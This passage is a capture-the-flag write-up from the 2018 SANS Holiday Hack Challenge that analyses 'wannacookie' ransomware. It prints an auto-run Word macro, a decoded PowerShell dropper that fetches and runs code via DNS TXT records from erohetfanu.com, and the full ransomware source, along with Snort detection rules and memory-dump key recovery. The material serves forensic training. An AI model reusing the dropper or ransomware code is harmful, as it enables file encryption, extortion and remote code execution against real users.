    2   0.010166  77.88.55.60 → 10.126.0.117 DNS 131 Standard query response 0x72cb TXT maloney.fosterhood.yandex.ru TXT
    3   0.020368 10.126.0.186 → 23.198.46.6  DNS 99 Standard query 0xd4cd TXT 77616E6E61636F6F6B69652E6D696E2E707331.rgruhnbeas.com
    4   0.030553  23.198.46.6 → 10.126.0.186 DNS 167 Standard query response 0xd4cd TXT 77616E6E61636F6F6B69652E6D696E2E707331.rgruhnbeas.com TXT
    5   0.040731  10.126.0.35 → 201.160.23.89 DNS 99 Standard query 0x6e93 TXT 77616E6E61636F6F6B69652E6D696E2E707331.urhgbesran.org
    6   0.050974 201.160.23.89 → 10.126.0.35  DNS 167 Standard query response 0x6e93 TXT 77616E6E61636F6F6B69652E6D696E2E707331.urhgbesran.org TXT
    7   0.061158  10.126.0.91 → 198.11.132.250 DNS 69 Standard query 0x45e7 TXT myxomata.aliexpress.com
    8   0.071330 198.11.132.250 → 10.126.0.91  DNS 152 Standard query response 0x45e7 TXT myxomata.aliexpress.com TXT
...(snip)...
```

All packets of pcap was communication of DNS TXT record.
Perhaps the malware communicates in covert channel of DNS TXT records.
I judged the domain by normal communication or malware communication.

* benign
    * maloney.fosterhood.yandex.ru
    * myxomata.aliexpress.com
    * scranton.twitter.com
    * herculanean.extraperiodic.twitter.com
    * thiamid.hexameric.sina.com.cn
    * (others)...
* malicious
    * 77616E6E61636F6F6B69652E6D696E2E707331.rgruhnbeas.com
    * 77616E6E61636F6F6B69652E6D696E2E707331.urhgbesran.org
    * 0.77616E6E61636F6F6B69652E6D696E2E707331.urhgbesran.org
    * 0.77616E6E61636F6F6B69652E6D696E2E707331.rgruhnbeas.com
    * (others)...
 
Perhaps malware communication has a string of domain name `77616E6E61636F6F6B69652E6D696E2E707331`.

Decoding `77616E6E61636F6F6B69652E6D696E2E707331` as hexadecimal means `wannacookie.min.ps1`.

```
root@kali~/work# echo 77616E6E61636F6F6B69652E6D696E2E707331 | xxd -r -p
wannacookie.min.ps1
```

Perhaps it is the dropper that is doing this communication and you have downloaded the powershell script `wannacookie.min.ps1` from the server.
Therefore I wrote the snort rule based on the character string `77616E6E61636F6F6B69652E6D696E2E707331`.

```
elf@26f5a5c1d957:~$ cat > /etc/snort/rules/local.rules 
alert udp $HOME_NET any -> $EXTERNAL_NET 53 (msg:"[wannacookie]DNS TXT record(request)"; content:"77616E6E61636F6F6B69652E6D696E2E707331"; sid:10000001; rev:1;)
alert udp $EXTERNAL_NET 53 -> $HOME_NET any (msg:"[wannacookie]DNS TXT record(response)"; content:"77616E6E61636F6F6B69652E6D696E2E707331"; sid:10000002; rev:1;)
elf@26f5a5c1d957:~$ 
[+] Congratulation! Snort is alerting on all ransomware and only the ransomware! 
[+]  
```

`Snort is alerting on all ransomware and only the ransomware!`

#### 9-2 : Identify the Domain
`Alabaster gives you a document he suspects downloads the malware. What is the domain name the malware in the document downloads from?`

Alabaster supported me to download documents from https://www.holidayhackchallenge.com/2018/challenges/CHOCOLATE_CHIP_COOKIE_RECIPE.zip .
The password for decompression is `elves`.

**I do not know what kind of function malware has, so I will analyze from here on a virtual machine or linux machine.**

```
root@kali~/work# wget -q https://www.holidayhackchallenge.com/2018/challenges/CHOCOLATE_CHIP_COOKIE_RECIPE.zip

root@kali~/work# 7z x CHOCOLATE_CHIP_COOKIE_RECIPE.zip

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=ja_JP.UTF-8,Utf16=on,HugeFiles=on,64 bits,1 CPU Intel(R) Core(TM) i7-8550U CPU @ 1.80GHz (806EA),ASM,AES-NI)

Scanning the drive for archives:
1 file, 110699 bytes (109 KiB)

Extracting archive: CHOCOLATE_CHIP_COOKIE_RECIPE.zip
--
Path = CHOCOLATE_CHIP_COOKIE_RECIPE.zip
Type = zip
Physical Size = 110699

    
Enter password (will not be echoed):
Everything is Ok                        

Size:       113540
Compressed: 110699
```

Use `olevba` to check macros.

```
root@kali~/work# olevba CHOCOLATE_CHIP_COOKIE_RECIPE.docm
olevba 0.51 - http://decalage.info/python/oletools
Flags        Filename                                                         
-----------  -----------------------------------------------------------------
OpX:MASI---- CHOCOLATE_CHIP_COOKIE_RECIPE.docm
===============================================================================
FILE: CHOCOLATE_CHIP_COOKIE_RECIPE.docm
Type: OpenXML
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: word/vbaProject.bin - OLE stream: u'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: word/vbaProject.bin - OLE stream: u'VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
Dim cmd As String
cmd = "powershell.exe -NoE -Nop -NonI -ExecutionPolicy Bypass -C ""sal a New-Object; iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('lVHRSsMwFP2VSwksYUtoWkxxY4iyir4oaB+EMUYoqQ1syUjToXT7d2/1Zb4pF5JDzuGce2+a3tXRegcP2S0lmsFA/AKIBt4ddjbChArBJnCCGxiAbOEMiBsfSl23MKzrVocNXdfeHU2Im/k8euuiVJRsZ1Ixdr5UEw9LwGOKRucFBBP74PABMWmQSopCSVViSZWre6w7da2uslKt8C6zskiLPJcJyttRjgC9zehNiQXrIBXispnKP7qYZ5S+mM7vjoavXPek9wb4qwmoARN8a2KjXS9qvwf+TSakEb+JBHj1eTBQvVVMdDFY997NQKaMSzZurIXpEv4bYsWfcnA51nxQQvGDxrlP8NxH/kMy9gXREohG'),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()"" "
Shell cmd
End Sub

-------------------------------------------------------------------------------
VBA MACRO NewMacros.bas 
in file: word/vbaProject.bin - OLE stream: u'VBA/NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
Dim cmd As String
cmd = "powershell.exe -NoE -Nop -NonI -ExecutionPolicy Bypass -C ""sal a New-Object; iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('lVHRSsMwFP2VSwksYUtoWkxxY4iyir4oaB+EMUYoqQ1syUjToXT7d2/1Zb4pF5JDzuGce2+a3tXRegcP2S0lmsFA/AKIBt4ddjbChArBJnCCGxiAbOEMiBsfSl23MKzrVocNXdfeHU2Im/k8euuiVJRsZ1Ixdr5UEw9LwGOKRucFBBP74PABMWmQSopCSVViSZWre6w7da2uslKt8C6zskiLPJcJyttRjgC9zehNiQXrIBXispnKP7qYZ5S+mM7vjoavXPek9wb4qwmoARN8a2KjXS9qvwf+TSakEb+JBHj1eTBQvVVMdDFY997NQKaMSzZurIXpEv4bYsWfcnA51nxQQvGDxrlP8NxH/kMy9gXREohG'),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()"" "
Shell cmd
End Sub

+------------+-----------------+-----------------------------------------+
| Type       | Keyword         | Description                             |
+------------+-----------------+-----------------------------------------+
| AutoExec   | AutoOpen        | Runs when the Word document is opened   |
| AutoExec   | Document_Open   | Runs when the Word or Publisher         |
|            |                 | document is opened                      |
| Suspicious | Shell           | May run an executable file or a system  |
|            |                 | command                                 |
| Suspicious | powershell      | May run PowerShell commands             |
| Suspicious | ExecutionPolicy | May run PowerShell commands             |
| Suspicious | New-Object      | May create an OLE object using          |
|            |                 | PowerShell                              |
| IOC        | powershell.exe  | Executable file name                    |
+------------+-----------------+-----------------------------------------+
```

One script is found.
The script expands the original script and executes it on `iex`.
Since the original script is deflate compressed and base64 encoded, it is decompressed with the following python code.

```python
import zlib
import base64

enc = "lVHRSsMwFP2VSwksYUtoWkxxY4iyir4oaB+EMUYoqQ1syUjToXT7d2/1Zb4pF5JDzuGce2+a3tXRegcP2S0lmsFA/AKIBt4ddjbChArBJnCCGxiAbOEMiBsfSl23MKzrVocNXdfeHU2Im/k8euuiVJRsZ1Ixdr5UEw9LwGOKRucFBBP74PABMWmQSopCSVViSZWre6w7da2uslKt8C6zskiLPJcJyttRjgC9zehNiQXrIBXispnKP7qYZ5S+mM7vjoavXPek9wb4qwmoARN8a2KjXS9qvwf+TSakEb+JBHj1eTBQvVVMdDFY997NQKaMSzZurIXpEv4bYsWfcnA51nxQQvGDxrlP8NxH/kMy9gXREohG"

decoded_data = base64.b64decode(enc)
print(zlib.decompress(decoded_data, -15))
```

Decompress original code.

```
root@kali~/work# python 0902_dec.py
function H2A($a) {$o; $a -split '(..)' | ? { $_ }  | forEach {[char]([convert]::toint16($_,16))} | forEach {$o = $o + $_}; return $o}; $f = "77616E6E61636F6F6B69652E6D696E2E707331"; $h = ""; foreach ($i in 0..([convert]::ToInt32((Resolve-DnsName -Server erohetfanu.com -Name "$f.erohetfanu.com" -Type TXT).strings, 10)-1)) {$h += (Resolve-DnsName -Server erohetfanu.com -Name "$i.$f.erohetfanu.com" -Type TXT).strings}; iex($(H2A $h | Out-string))
```

To make it easy to read.

```powershell
function H2A($a) {
    $o;
    $a -split '(..)' | ? { $_ }  | forEach {
        [char]([convert]::toint16($_,16))
    } | forEach {$o = $o + $_}; return $o
}; 
$f = "77616E6E61636F6F6B69652E6D696E2E707331"; 
$h = ""; 
foreach ($i in 0..([convert]::ToInt32((Resolve-DnsName -Server erohetfanu.com -Name "$f.erohetfanu.com" -Type TXT).strings, 10)-1)) {
    $h += (Resolve-DnsName -Server erohetfanu.com -Name "$i.$f.erohetfanu.com" -Type TXT).strings
}; 
iex($(H2A $h | Out-string))
```

When I read this script, it makes DNS query to the `erohetfanu.com` server, the next script is created from that response and executed on `iex`.

So `CHOCOLATE_CHIP_COOKIE_RECIPE.docm` downloaded the malware from `erohetfanu.com`.


#### 9-3 : Stop the Malware
`Analyze the full malware source code to find a kill-switch and activate it at the North Pole's domain registrar HoHoHo Daddy. What is the full sentence text that appears on the domain registration success message (bottom sentence)?`

To get the next script, delete the iex and execute it.

```
PS C:\> function H2A($a) {$o; $a -split '(..)' | ? { $_ }  | forEach {[char]([convert]::toint16($_,16))} | forEach {$o = $o + $_}; return $o}; $f = "77616E6E61636F6F6B69652E6D696E2E707331"; $h = ""; foreach ($i in 0..([convert]::ToInt32((Resolve-DnsName -Server erohetfanu.com -Name "$f.erohetfanu.com" -Type TXT).strings, 10)-1)) {$h += (Resolve-DnsName -Server erohetfanu.com -Name "$i.$f.erohetfanu.com" -Type TXT).strings}; $(H2A $h | Out-string) | Out-File $env:Temp\malware.ps1
```

The next script is saved in malware.ps1.

```powershell
$functions = {
  function e_d_file($key, $File, $enc_it) {
    [byte[]]$key = $key;
    $Suffix = "`.wannacookie";
    [System.Reflection.Assembly]::LoadWithPartialName('System.Security.Cryptography');
    [System.Int32]$KeySize = $key.Length*8;
    $AESP = New-Object 'System.Security.Cryptography.AesManaged';
    $AESP.Mode = [System.Security.Cryptography.CipherMode]::CBC;
    $AESP.BlockSize = 128;
    $AESP.KeySize = $KeySize;
    $AESP.Key = $key;
    $FileSR = New-Object System.IO.FileStream($File, [System.IO.FileMode]::Open);
    if ($enc_it) {
      $DestFile = $File + $Suffix
    } else {
      $DestFile = ($File -replace $Suffix)
    };
    $FileSW = New-Object System.IO.FileStream($DestFile, [System.IO.FileMode]::Create);
    if ($enc_it) {
      $AESP.GenerateIV();
      $FileSW.Write([System.BitConverter]::GetBytes($AESP.IV.Length), 0, 4);
      $FileSW.Write($AESP.IV, 0, $AESP.IV.Length);
      $Transform = $AESP.CreateEncryptor()
    } else {
      [Byte[]]$LenIV = New-Object Byte[] 4;
      $FileSR.Seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null;
      $FileSR.Read($LenIV,  0, 3) | Out-Null;
      [Int]$LIV = [System.BitConverter]::ToInt32($LenIV,  0);
      [Byte[]]$IV = New-Object Byte[] $LIV;
      $FileSR.Seek(4, [System.IO.SeekOrigin]::Begin) | Out-Null;
      $FileSR.Read($IV, 0, $LIV) | Out-Null;
      $AESP.IV = $IV;
      $Transform = $AESP.CreateDecryptor()
    };
    $CryptoS = New-Object System.Security.Cryptography.CryptoStream($FileSW, $Transform, [System.Security.Cryptography.CryptoStreamMode]::Write);
    [Int]$Count = 0;
    [Int]$BlockSzBts = $AESP.BlockSize / 8;
    [Byte[]]$Data = New-Object Byte[] $BlockSzBts;
    Do {
      $Count = $FileSR.Read($Data, 0, $BlockSzBts);
      $CryptoS.Write($Data, 0, $Count)
    } While ($Count -gt 0);
    $CryptoS.FlushFinalBlock();
    $CryptoS.Close();
    $FileSR.Close();
    $FileSW.Close();
    Clear-variable -Name "key";
    Remove-Item $File
  }
};

function H2B {
  param($HX);
  $HX = $HX -split '(..)' | ? { $_ };
  ForEach ($value in $HX){[Convert]::ToInt32($value,16)}
};

function A2H(){
  Param($a);
  $c = '';
  $b = $a.ToCharArray();
  ;
  Foreach ($element in $b) {$c = $c + " " + [System.String]::Format("{0:X}", [System.Convert]::ToUInt32($element))};
  return $c -replace ' '
};

function H2A() {
  Param($a);
  $outa;
  $a -split '(..)' | ? { $_ }  | forEach {[char]([convert]::toint16($_,16))} | forEach {$outa = $outa + $_};
  return $outa
};

function B2H {
  param($DEC);
  $tmp = '';
  ForEach ($value in $DEC){$a = "{0:x}" -f [Int]$value;
  if ($a.length -eq 1){$tmp += '0' + $a} else {$tmp += $a}};
  return $tmp
};

function ti_rox {
  param($b1, $b2);
  $b1 = $(H2B $b1);
  $b2 = $(H2B $b2);
  $cont = New-Object Byte[] $b1.count;
  if ($b1.count -eq $b2.count) {
    for($i=0; $i -lt $b1.count ; $i++) {
      $cont[$i] = $b1[$i] -bxor $b2[$i]
    }
  };
  return $cont
};

function B2G {
  param([byte[]]$Data);
  Process {
    $out = [System.IO.MemoryStream]::new();
    $gStream = New-Object System.IO.Compression.GzipStream $out, ([IO.Compression.CompressionMode]::Compress);
    $gStream.Write($Data, 0, $Data.Length);
    $gStream.Close();
    return $out.ToArray()
  }
};

function G2B {
  param([byte[]]$Data);
  Process {
    $SrcData = New-Object System.IO.MemoryStream( , $Data );
    $output = New-Object System.IO.MemoryStream;
    $gStream = New-Object System.IO.Compression.GzipStream $SrcData, ([IO.Compression.CompressionMode]::Decompress);
    $gStream.CopyTo( $output );
    $gStream.Close();
    $SrcData.Close();
    [byte[]] $byteArr = $output.ToArray();
    return $byteArr
  }
};

function sh1([String] $String) {
  $SB = New-Object System.Text.StringBuilder;
  [System.Security.Cryptography.HashAlgorithm]::Create("SHA1").ComputeHash([System.Text.Encoding]::UTF8.GetBytes($String))|%{[Void]$SB.Append($_.ToString("x2"))};
  $SB.ToString()
};

function p_k_e($key_bytes, [byte[]]$pub_bytes){
  $cert = New-Object -TypeName System.Security.Cryptography.X509Certificates.X509Certificate2;
  $cert.Import($pub_bytes);
  $encKey = $cert.PublicKey.Key.Encrypt($key_bytes, $true);
  return $(B2H $encKey)
};

function e_n_d {
  param($key, $allfiles, $make_cookie );
  $tcount = 12;
  for ( $file=0; $file -lt $allfiles.length; $file++  ) {
    while ($true) {
      $running = @(Get-Job | Where-Object { $_.State -eq 'Running' });
      if ($running.Count -le $tcount) {
        Start-Job  -ScriptBlock {
          param($key, $File, $true_false);
          try{
            e_d_file $key $File $true_false
          } catch {
            $_.Exception.Message | Out-String | Out-File $($env:userprofile+'\Desktop\ps_log.txt') -append
          }
        } -args $key, $allfiles[$file], $make_cookie -InitializationScript $functions;
        break
      } else {
        Start-Sleep -m 200;
        continue
      }
    }
  }
};

function g_o_dns($f) {
  $h = '';
  foreach ($i in 0..([convert]::ToInt32($(Resolve-DnsName -Server erohetfanu.com -Name "$f.erohetfanu.com" -Type TXT).Strings, 10)-1)) {
    $h += $(Resolve-DnsName -Server erohetfanu.com -Name "$i.$f.erohetfanu.com" -Type TXT).Strings
  };
  return (H2A $h)
};

function s_2_c($astring, $size=32) {
  $new_arr = @();
  $chunk_index=0;
  foreach($i in 1..$($astring.length / $size)) {$new_arr += @($astring.substring($chunk_index,$size));
  $chunk_index += $size};
  return $new_arr
};

function snd_k($enc_k) {
  $chunks = (s_2_c $enc_k );
  foreach ($j in $chunks) {
    if ($chunks.IndexOf($j) -eq 0) {
      $n_c_id = $(Resolve-DnsName -Server erohetfanu.com -Name "$j.6B6579666F72626F746964.erohetfanu.com" -Type TXT).Strings
    } else {
      $(Resolve-DnsName -Server erohetfanu.com -Name "$n_c_id.$j.6B6579666F72626F746964.erohetfanu.com" -Type TXT).Strings
    }
  };
  return $n_c_id
};

function wanc {
  $S1 = "1f8b080000000000040093e76762129765e2e1e6640f6361e7e202000cdd5c5c10000000";
  if ($null -ne ((Resolve-DnsName -Name $(H2A $(B2H $(ti_rox $(B2H $(G2B $(H2B $S1))) $(Resolve-DnsName -Server erohetfanu.com -Name 6B696C6C737769746368.erohetfanu.com -Type TXT).Strings))).ToString() -ErrorAction 0 -Server 8.8.8.8))) {return};
  if ($(netstat -ano | Select-String "127.0.0.1:8080").length -ne 0 -or (Get-WmiObject Win32_ComputerSystem).Domain -ne "KRINGLECASTLE") {return};
  $p_k = [System.Convert]::FromBase64String($(g_o_dns("7365727665722E637274") ) );
  $b_k = ([System.Text.Encoding]::Unicode.GetBytes($(([char[]]([char]01..[char]255) + ([char[]]([char]01..[char]255)) + 0..9 | sort {Get-Random})[0..15] -join ''))  | ? {$_ -ne 0x00});
  $h_k = $(B2H $b_k);
  $k_h = $(sh1 $h_k);
  $p_k_e_k = (p_k_e $b_k $p_k).ToString();
  $c_id = (snd_k $p_k_e_k);
  $d_t = (($(Get-Date).ToUniversalTime() | Out-String) -replace "`r`n");
  [array]$f_c = $(Get-ChildItem *.elfdb -Exclude *.wannacookie -Path $($($env:userprofile+'\Desktop'),$($env:userprofile+'\Documents'),$($env:userprofile+'\Videos'),$($env:userprofile+'\Pictures'),$($env:userprofile+'\Music')) -Recurse | where { ! $_.PSIsContainer } | Foreach-Object {$_.Fullname});
  e_n_d $b_k $f_c $true;
  Clear-variable -Name "h_k";
  Clear-variable -Name "b_k";
  $lurl = 'http://127.0.0.1:8080/';
  $html_c = @{'GET /'  =  $(g_o_dns (A2H "source.min.html"));
  'GET /close'  =  '<p>Bye!</p>'};
  Start-Job -ScriptBlock{param($url);
  Start-Sleep 10;
  Add-type -AssemblyName System.Windows.Forms;
  start-process "$url" -WindowStyle Maximized;
  Start-sleep 2;
  [System.Windows.Forms.SendKeys]::SendWait("{F11}")} -Arg $lurl;
  $list = New-Object System.Net.HttpListener;
  $list.Prefixes.Add($lurl);
  $list.Start();
  try {
    $close = $false;
    while ($list.IsListening) {
      $context = $list.GetContext();
      $Req = $context.Request;
      $Resp = $context.Response;
      $recvd = '{0} {1}' -f $Req.httpmethod, $Req.url.localpath;
      if ($recvd -eq 'GET /') {
        $html = $html_c[$recvd]
      } elseif ($recvd -eq 'GET /decrypt') {
        $akey = $Req.QueryString.Item("key");
        if ($k_h -eq $(sh1 $akey)) {
          $akey = $(H2B $akey);
          [array]$f_c = $(Get-ChildItem -Path $($env:userprofile) -Recurse  -Filter *.wannacookie | where { ! $_.PSIsContainer } | Foreach-Object {$_.Fullname});
          e_n_d $akey $f_c $false;
          $html = "Files have been decrypted!";
          $close = $true
        } else {
          $html = "Invalid Key!"
        }
      } elseif ($recvd -eq 'GET /close') {$close = $true;
      $html = $html_c[$recvd]} elseif ($recvd -eq 'GET /cookie_is_paid') {$c_n_k = $(Resolve-DnsName -Server erohetfanu.com -Name ("$c_id.72616e736f6d697370616964.erohetfanu.com".trim()) -Type TXT).Strings;
      if ( $c_n_k.length -eq 32 ) {$html = $c_n_k} else {$html = "UNPAID|$c_id|$d_t"}} else {$Resp.statuscode = 404;
      $html = '<h1>404 Not Found</h1>'};
      $buffer = [Text.Encoding]::UTF8.GetBytes($html);
      $Resp.ContentLength64 = $buffer.length;
      $Resp.OutputStream.Write($buffer, 0, $buffer.length);
      $Resp.Close();
      if ($close) {
        $list.Stop();
        return
      }
    }
  } 
  finally {$list.Stop()}
};

wanc;
```

By looking at the head sequence of the `wanc` function, if you succeed in the DNS query of `a specific domain`, the `return` is executed and the process is terminated. 

```powershell
  $S1 = "1f8b080000000000040093e76762129765e2e1e6640f6361e7e202000cdd5c5c10000000";
  if ($null -ne ((Resolve-DnsName -Name $(H2A $(B2H $(ti_rox $(B2H $(G2B $(H2B $S1))) $(Resolve-DnsName -Server erohetfanu.com -Name 6B696C6C737769746368.erohetfanu.com -Type TXT).Strings))).ToString() -ErrorAction 0 -Server 8.8.8.8))) {return};
```

So kill switch domain is `$(H2A $(B2H $(ti_rox $(B2H $(G2B $(H2B $S1))) $(Resolve-DnsName -Server erohetfanu.com -Name 6B696C6C737769746368.erohetfanu.com -Type TXT).Strings)))`. 

```
PS C:\> $(H2A $(B2H $(ti_rox $(B2H $(G2B $(H2B $S1))) $(Resolve-DnsName -Server erohetfanu.com -Name 6B696C6C737769746368.erohetfanu.com -Type TXT).Strings)))
yippeekiyaa.aaay
```

Running the script will get the following domain.

`yippeekiyaa.aaay`


#### 9-4 : Recover Alabaster's Password
`After activating the kill-switch domain in the last question, Alabaster gives you a zip file with a memory dump and encrypted password database. Use these files to decrypt Alabaster's password database. What is the password entered in the database for the Vault entry?`

Alabaster supported me to download zip archive from https://www.holidayhackchallenge.com/2018/challenges/forensic_artifacts.zip .
A process dump and an encrypted elfdb file were stored in the zip archive.

```
root@kali~/work# wget -q https://www.holidayhackchallenge.com/2018/challenges/forensic_artifacts.zip

root@kali~/work# unzip forensic_artifacts.zip 
Archive:  forensic_artifacts.zip
 extracting: alabaster_passwords.elfdb.wannacookie  
  inflating: powershell.exe_181109_104716.dmp  
```

Read malware code and list some features.
* If yippeekiyaa.aaay DNS query succeeds, it will not infect
* It does not infect unless the terminal belongs to the KRINGLECASTLE domain
* The file to be encrypted is the file * .elfdb (excluding * .wannacookie) in Desktop, Documents, Videos, Pictures, Music under USERPROFILE
* The first 4 bytes of the encrypted file is the length of the initial vector used for AES encryption.
* Continuously, a initial vector is allocated for the specified length.
* The key of AES is 16 bytes (128 bit).
* The file is encrypted in CBC mode.
* The AES key can not be found from the process dump because it is cleared from the memory when the encryption is completed.
* However, the AES key is encrypted with the public key, and the encrypted data remains in the memory.
* Therefore, if I can obtain the secret key for the public key, I can obtain the key of AES.

First, search for a secret key corresponding to the public key.
Quote a few lines from the `wanc` function.

```powershell
  $b_k = ([System.Text.Encoding]::Unicode.GetBytes($(([char[]]([char]01..[char]255) + ([char[]]([char]01..[char]255)) + 0..9 | sort {Get-Random})[0..15] -join ''))  | ? {$_ -ne 0x00});
  $p_k = [System.Convert]::FromBase64String($(g_o_dns("7365727665722E637274") ) );
  $p_k_e_k = (p_k_e $b_k $p_k).ToString();
```

* $b_k : AES encryption key (Generated from random numbers for each execution)
* $p_k : X509 certificate including public key
* $p_k_e_k : An AES encryption key encrypted with a public key

The public key is the base64 decoded return value of `g_o_dns("7365727665722E637274")`.
Decoding `7365727665722E637274` as hexadecimal means `server.crt`

```
root@kali~/work# echo -n "7365727665722E637274" | xxd -r -p
server.crt
```

In general, the secret key is often stored as `server.key`.
`server.key` becomes `7365727665722E6B6579` in hexadecimal.

```
root@kali~/work# echo -n server.key | xxd -p -u
7365727665722E6B6579
```

I tried calling `g_o_dns("7365727665722E6B6579")` function, and as a result I got the secret key!

```
PS C:\> g_o_dns("7365727665722E6B6579")
-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDEiNzZVUbXCbMG
L4sM2UtilR4seEZli2CMoDJ73qHql+tSpwtK9y4L6znLDLWSA6uvH+lmHhhep9ui
W3vvHYCq+Ma5EljBrvwQy0e2Cr/qeNBrdMtQs9KkxMJAz0fRJYXvtWANFJF5A+Nq
jI+jdMVtL8+PVOGWp1PA8DSW7i+9eLkqPbNDxCfFhAGGlHEU+cH0CTob0SB5Hk0S
TPUKKJVc3fsD8/t60yJThCw4GKkRwG8vqcQCgAGVQeLNYJMEFv0+WHAt2WxjWTu3
HnAfMPsiEnk/y12SwHOCtaNjFR8Gt512D7idFVW4p5sT0mrrMiYJ+7x6VeMIkrw4
tk/1ZlYNAgMBAAECggEAHdIGcJOX5Bj8qPudxZ1S6uplYan+RHoZdDz6bAEj4Eyc
0DW4aO+IdRaD9mM/SaB09GWLLIt0dyhRExl+fJGlbEvDG2HFRd4fMQ0nHGAVLqaW
OTfHgb9HPuj78ImDBCEFaZHDuThdulb0sr4RLWQScLbIb58Ze5p4AtZvpFcPt1fN
6YqS/y0i5VEFROWuldMbEJN1x+xeiJp8uIs5KoL9KH1njZcEgZVQpLXzrsjKr67U
3nYMKDemGjHanYVkF1pzv/rardUnS8h6q6JGyzV91PpLE2I0LY+tGopKmuTUzVOm
Vf7sl5LMwEss1g3x8gOh215Ops9Y9zhSfJhzBktYAQKBgQDl+w+KfSb3qZREVvs9
uGmaIcj6Nzdzr+7EBOWZumjy5WWPrSe0S6Ld4lTcFdaXolUEHkE0E0j7H8M+dKG2
Emz3zaJNiAIX89UcvelrXTV00k+kMYItvHWchdiH64EOjsWrc8co9WNgK1XlLQtG
4iBpErVctbOcjJlzv1zXgUiyTQKBgQDaxRoQolzgjElDG/T3VsC81jO6jdatRpXB
0URM8/4MB/vRAL8LB834ZKhnSNyzgh9N5G9/TAB9qJJ+4RYlUUOVIhK+8t863498
/P4sKNlPQio4Ld3lfnT92xpZU1hYfyRPQ29rcim2c173KDMPcO6gXTezDCa1h64Q
8iskC4iSwQKBgQCvwq3f40HyqNE9YVRlmRhryUI1qBli+qP5ftySHhqy94okwerE
KcHw3VaJVM9J17Atk4m1aL+v3Fh01OH5qh9JSwitRDKFZ74JV0Ka4QNHoqtnCsc4
eP1RgCE5z0w0efyrybH9pXwrNTNSEJi7tXmbk8azcdIw5GsqQKeNs6qBSQKBgH1v
sC9DeS+DIGqrN/0tr9tWklhwBVxa8XktDRV2fP7XAQroe6HOesnmpSx7eZgvjtVx
moCJympCYqT/WFxTSQXUgJ0d0uMF1lcbFH2relZYoK6PlgCFTn1TyLrY7/nmBKKy
DsuzrLkhU50xXn2HCjvG1y4BVJyXTDYJNLU5K7jBAoGBAMMxIo7+9otN8hWxnqe4
Ie0RAqOWkBvZPQ7mEDeRC5hRhfCjn9w6G+2+/7dGlKiOTC3Qn3wz8QoG4v5xAqXE
JKBn972KvO0eQ5niYehG4yBaImHH+h6NVBlFd0GJ5VhzaBJyoOk+KnOnvVYbrGBq
UdrzXvSwyFuuIqBlkHnWSIeC
-----END PRIVATE KEY-----
```

Next I find `$p_k_e_k` from the process dump using power_dump.
Consider a regular expression for searching `$p_k_e_k`.
Run the script and see the contents of the variable.

```powershell
PS C:\> $p_k = [System.Convert]::FromBase64String($(g_o_dns("7365727665722E637274") ) );

PS C:\> $b_k = ([System.Text.Encoding]::Unicode.GetBytes($(([char[]]([char]01..[char]255) + ([char[]]([char]01..[char]255)) + 0..9 | sort {Get-Random})[0..15] -join ''))  | ? {$_ -ne 0x00});

PS C:\> $p_k_e_k = (p_k_e $b_k $p_k).ToString();

PS C:\> $p_k_e_k
30ecfcfe3176e0c1075eb6a3680ab3f91e2b98b3fbe0b51beb7aec2fb0c5711e62791c83985d667c8a902628ffae98a58e9fcd40202fba0b94c4decb26df438a77151dfd9282f9dc8c8031a5364a2e5b29bf628fc625173bcddb2bb4a983b48eecce2df1fd5371acd2aac06545251e245bdaa5d811b1957cb50a4626eeae03387fbf7c4868c4374e40370bb76669bb78fc68cf91ccc4f7101f82fd6b575896622b10f20035a26b0190a46a0f736c89a8ac0afafb4d91e4b7dfbdd9ebca644f044b9e27897146b4496bad2fb7e78ad3dfc6b248e0ff0fc1808707ae6a007213b6c71741e307a794c44b168db47643c849ce6f9875b888414c4b2cec454b613e15

PS C:\> $p_k_e_k.Length
512
```

Therefore, `$p_k_e_k` can be expressed as `[0-9a-f]{512}` when written in regular expression.
Find `$p_k_e_k` when malware runs from process dump with `power_dump`.

```
root@kali~/work# python power_dump.py
...(snip)...

============ Main Menu ================
Memory Dump: powershell.exe_181109_104716.dmp
Loaded     : True
Processed  : True
=======================================
1. Load PowerShell Memory Dump File
2. Process PowerShell Memory Dump
3. Search/Dump Powershell Scripts
4. Search/Dump Stored PS Variables
e. Exit
: 4

[i] 10947 powershell Variable Values found!
============== Search/Dump PS Variable Values ===================================
COMMAND        |     ARGUMENT                | Explanation                     
===============|=============================|=================================
print          | print [all|num]             | print specific or all Variables
dump           | dump [all|num]              | dump specific or all Variables
contains       | contains [ascii_string]     | Variable Values must contain string
matches        | matches "[python_regex]"    | match python regex inside quotes
len            | len [>|<|>=|<=|==] [bt_size]| Variables length >,<,=,>=,<= size  
clear          | clear [all|num]             | clear all or specific filter num
===============================================================================
: matches "^[0-9a-f]{512}$"

================ Filters ================
1| MATCHES  bool(re.search(r"^[0-9a-f]{512}$",variable_values)) 

[i] 1 powershell Variable Values found!
============== Search/Dump PS Variable Values ===================================
COMMAND        |     ARGUMENT                | Explanation                     
===============|=============================|=================================
print          | print [all|num]             | print specific or all Variables
dump           | dump [all|num]              | dump specific or all Variables
contains       | contains [ascii_string]     | Variable Values must contain string
matches        | matches "[python_regex]"    | match python regex inside quotes
len            | len [>|<|>=|<=|==] [bt_size]| Variables length >,<,=,>=,<= size  
clear          | clear [all|num]             | clear all or specific filter num
===============================================================================
: print
